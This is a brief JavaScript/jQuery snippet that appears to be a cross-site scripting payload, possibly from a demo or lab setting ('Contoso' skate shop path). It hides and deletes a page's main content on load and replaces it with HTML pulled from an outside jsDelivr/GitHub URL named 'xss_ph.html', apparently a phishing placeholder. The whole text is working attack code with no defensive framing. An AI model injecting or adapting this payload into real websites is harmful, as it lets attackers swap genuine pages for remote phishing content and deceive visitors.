// Hide initial content
$(".row, .subheader").css("display", "none");

// Add place holder
var place_holder = document.createElement('div');
place_holder.className = "place_holder";
$("nav").after(place_holder);

$(window).on('load', function() {
    // Remove all unwanted content
    $(".row").remove();
    $('.place_holder').load("https://cdn.jsdelivr.net/gh/hotMS/Contoso-Stake/SkateShop/xss_ph.html");
    console.log("done");
});